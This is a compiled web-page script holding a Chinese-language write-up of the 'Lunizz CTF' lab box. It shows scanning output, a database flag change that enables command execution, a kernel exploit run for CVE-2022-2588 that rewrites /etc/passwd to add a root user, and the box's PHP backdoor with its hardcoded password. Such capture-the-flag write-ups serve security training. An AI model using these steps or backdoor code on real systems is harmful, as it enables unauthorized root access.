"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8726],{82461:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>l,contentTitle:()=>i,default:()=>u,frontMatter:()=>a,metadata:()=>o,toc:()=>c});var s=t(74848),r=t(28453);const a={sidebar_position:134,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165"],title:"Lunizz CTF",description:"Lunizz CTF",sidebar_label:"Lunizz CTF",slug:"/tryhackme/134"},i="Lunizz CTF",o={id:"box/TryHackMe/134",title:"Lunizz CTF",description:"Lunizz CTF",source:"@site/docs/box/TryHackMe/134.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/134",permalink:"/docs/tryhackme/134",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"}],version:"current",sidebarPosition:134,frontMatter:{sidebar_position:134,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165"],title:"Lunizz CTF",description:"Lunizz CTF",sidebar_label:"Lunizz CTF",slug:"/tryhackme/134"},sidebar:"boxSidebar",previous:{title:"Ghizer",permalink:"/docs/tryhackme/133"},next:{title:"VulnNet: dotpy",permalink:"/docs/tryhackme/135"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"3306",id:"3306",level:2},{value:"80",id:"80-1",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; root",id:"www-data--root",level:3},{value:"8080",id:"8080",level:2}];function d(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h1,{id:"lunizz-ctf",children:"Lunizz CTF"}),"\n",(0,s.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'root@ip-10-10-139-140:~/lunizzctfnd# nmap -sTCV -p 80,3306,4444,5000 --min-rate 1000 10.10.9.166\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-03 10:08 BST\nNmap scan report for ip-10-10-9-166.eu-west-1.compute.internal (10.10.9.166)\nHost is up (0.00019s latency).\n\nPORT     STATE SERVICE    VERSION\n80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n3306/tcp open  mysql      MySQL 5.7.33-0ubuntu0.18.04.1\n| mysql-info: \n|   Protocol: 10\n|   Version: 5.7.33-0ubuntu0.18.04.1\n|   Thread ID: 5\n|   Capabilities flags: 65535\n|   Some Capabilities: LongPassword, Support41Auth, LongColumnFlag, InteractiveClient, FoundRows, SupportsCompression, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, SupportsTransactions, ODBCClient, IgnoreSigpipes, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, ConnectWithDatabase, Speaks41ProtocolOld, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins\n|   Status: Autocommit\n|   Salt: 5bQ.\\x19\\x02\\\\x02"#\\x17r\\x1C:@HOaP0\n|_  Auth Plugin Name: 96\n4444/tcp open  tcpwrapped\n5000/tcp open  tcpwrapped\nMAC Address: 02:4B:D8:FC:FB:D5 (Unknown)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n'})}),"\n",(0,s.jsx)(e.h2,{id:"80",children:"80"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-139-140:~/lunizzctfnd# gobuster dir -u http://10.10.9.166/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.9.166/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/10/03 10:10:10 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/instructions.txt (Status: 200)\n/hidden (Status: 301)\n/whatever (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2023/10/03 10:20:03 Finished\n===============================================================\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u8bbf\u95ee\u626b\u63cf\u51fa\u6765\u7684\u6587\u4ef6:"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"instructions.txt : \u544a\u77e5\u4e86 Mysql \u7684\u8d26\u53f7"}),"\n",(0,s.jsx)(e.li,{children:"hidden  : \u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u7684\u4f4d\u7f6e\u9650\u5236\u4e86\u4e0a\u4f20\u7684\u7c7b\u578b"}),"\n",(0,s.jsx)(e.li,{children:"whatever  : \u547d\u4ee4\u6267\u884c\u7684\u4f4d\u7f6e, \u4f46\u662f\u6211\u6267\u884c\u6ca1\u6709\u4efb\u4f55\u6548\u679c, \u4f46\u662f\u5728\u5176\u4e0a\u6709\u4e00\u4e2a\u6807\u8bc6, \u611f\u89c9\u662f\u8fd9\u4e2a\u5e94\u8be5\u662f\u5f00\u5173"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-161428.png",alt:"image-20240709153621233"})}),"\n",(0,s.jsx)(e.h2,{id:"3306",children:"3306"}),"\n",(0,s.jsx)(e.p,{children:"\u5229\u7528\u5f97\u5230\u7684\u8d26\u53f7\u8bbf\u95ee\u6570\u636e\u5e93, \u53d1\u73b0\u5176\u4e2d\u7684\u6570\u636e\u8868\u4e2d\u53ea\u6709\u4e00\u4e2a\u5217, \u4ece\u6570\u636e\u8868\u7684\u540d\u79f0 runchek \u63a8\u65ad\u8fd9\u5e94\u8be5\u5c31\u662f\u6211\u4eec\u7684\u5f00\u5173, \u6240\u4ee5\u6211\u5c06\u5176\u4fee\u6539\u4e3a 1 \u5e76\u56de\u5230 80 \u7aef\u53e3\u8fdb\u884c\u6267\u884c"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-139-140:~/lunizzctfnd# mysql -h 10.10.9.166 -u runcheck -p \nEnter password: \nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 11\nServer version: 5.7.33-0ubuntu0.18.04.1 (Ubuntu)\n\nCopyright (c) 2000, 2023, Oracle and/or its affiliates.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| runornot           |\n+--------------------+\n2 rows in set (0.02 sec)\n\nmysql> use runornot;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql> show tables;\n+--------------------+\n| Tables_in_runornot |\n+--------------------+\n| runcheck           |\n+--------------------+\n1 row in set (0.02 sec)\n\nmysql> SELECT * FROM runcheck;\n+------+\n| run  |\n+------+\n|    0 |\n+------+\n1 row in set (0.02 sec)\nmysql> UPDATE runcheck SET run=1;\nQuery OK, 1 row affected (0.01 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n\nmysql> SELECT * FROM runcheck;\n+------+\n| run  |\n+------+\n|    1 |\n+------+\n1 row in set (0.00 sec)\n"})}),"\n",(0,s.jsx)(e.h2,{id:"80-1",children:"80"}),"\n",(0,s.jsx)(e.p,{children:"\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u539f\u672c\u7684 mode \u5df2\u7ecf\u53d1\u751f\u6539\u53d8\u4e86"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-161431.png",alt:"image-20240709153502264"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-161437.png",alt:"image-20240709153508747"})}),"\n",(0,s.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(e.h3,{id:"www-data",children:"www-data"}),"\n",(0,s.jsx)(e.p,{children:"\u5229\u7528\u4e0a\u9762\u7684\u547d\u4ee4\u6ce8\u5165\u83b7\u53d6\u4e00\u4e2a Shell"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-161438.png",alt:"image-20240709153533906"})}),"\n",(0,s.jsx)(e.h3,{id:"www-data--root",children:"www-data \u2014> root"}),"\n",(0,s.jsx)(e.p,{children:"\u6267\u884c linpeas \u53d1\u73b0\u4e00\u4e2a CVE \u6f0f\u6d1e\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u6765\u8fdb\u884c\u63d0\u6743"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-161440.png",alt:"image-20240709153523316"})}),"\n",(0,s.jsx)(e.p,{children:"\u4f46\u662f\u5728\u6211\u5229\u7528\u65f6\u53d1\u73b0\u65e0\u6cd5\u4f7f\u7528"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-161511.png",alt:"image-20240709161510369"})}),"\n",(0,s.jsxs)(e.p,{children:["\u770b\u4e86\u8bba\u575b\u540e\u5176\u63d0\u793a\u6211\u4f7f\u7528\u53e6\u4e00\u4e2a\u6f0f\u6d1e ",(0,s.jsx)(e.a,{href:"https://github.com/Markakd/CVE-2022-2588/tree/master",children:"GitHub - Markakd/CVE-2022-2588: exploit for CVE-2022-2588"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"(remote) www-data@lunizz:/tmp$ ./exp_file_credential \nself path /tmp/./exp_file_credential\nprepare done\nOld limits -> soft limit= 4096 \t hard limit= 4096 \nstarting exploit, num of cores: 1\ndefrag done\nspray 256 done\nfreed the filter object\n256 freed done\ndouble free done\nspraying files\nfound overlap, id : 13, 318\nstart slow write\nclosed overlap\ngot cmd, start spraying /etc/passwd\nspray done\nwrite done, spent 1.381854 s\nshould be after the slow write\nsucceed\n(remote) www-data@lunizz:/tmp$ cat /etc/passwd\nuser:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash  # \u5bc6\u7801\u662f user\n(remote) www-data@lunizz:/tmp$ su user\nPassword: \n\\[\\](remote)\\[\\] \\[\\]user@lunizz\\[\\]:\\[\\]/tmp\\[\\]$ id\nuid=0(user) gid=0(root) groups=0(root)\n"})}),"\n",(0,s.jsx)(e.h1,{id:"\u6269\u5c55",children:"\u6269\u5c55"}),"\n",(0,s.jsx)(e.h2,{id:"8080",children:"8080"}),"\n",(0,s.jsx)(e.p,{children:"\u5982\u679c\u4f60\u67e5\u770b\u8fdb\u7a0b\u4f60\u4f1a\u53d1\u73b0\u5176\u5728 8080 \u7aef\u53e3\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u4e86\u4e00\u4e2a\u7a0b\u5e8f, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7aef\u53e3\u8f6c\u53d1\u5c06\u5176\u4ee3\u7406\u5904\u7406, \u4f46\u662f\u5176\u9700\u8981\u5bc6\u7801\u8fdb\u884c\u8fde\u63a5, \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b\u6e90\u4ee3\u7801\u8fdb\u884c\u4e86\u89e3. \u53ef\u4ee5\u770b\u6210\u8fd9\u662f\u4e00\u4e2a\u540e\u95e8"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'\\[\\](remote)\\[\\] \\[\\]user@lunizz\\[\\]:\\[\\]/root\\[\\]$ cat index.php\n<?php\nif ($_SERVER[\'REQUEST_METHOD\'] == "POST") {\n        if (isset($_POST[\'password\']) and $_POST[\'password\'] == "northernlights") {\n                if (isset($_POST[\'cmdtype\'])) {\n                        if ($_POST[\'cmdtype\'] == "passwd") { system("echo -n \'northernlights\\nnorthernlights\' | passwd"); echo "<br>Password Changed To :northernlights<br>"; }\n                        if ($_POST[\'cmdtype\'] == "lsla") { system("ls -al /root"); }\n                        if ($_POST[\'cmdtype\'] == "reboot") { system("reboot"); }\n                }\n        } else {\n                echo "Wrong Password [your place ;)]!! \\n";\n        }\n}\n?>\n**********************************************************\n*                Mason\'s Root Backdoor                   *\n*                                                        *\n*   Please Send Request (with "password" and "cmdtype")  *\n*                                                        *\n**********************************************************\n-------------CMD TYPES-------------\nlsla\nreboot\npasswd\n'})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-161518.png",alt:"image-20240709161517872"})})]})}function u(n={}){const{wrapper:e}={...(0,r.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(d,{...n})}):d(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>i,x:()=>o});var s=t(96540);const r={},a=s.createContext(r);function i(n){const e=s.useContext(a);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(r):n.components||r:i(n.components),s.createElement(a.Provider,{value:e},n.children)}}}]);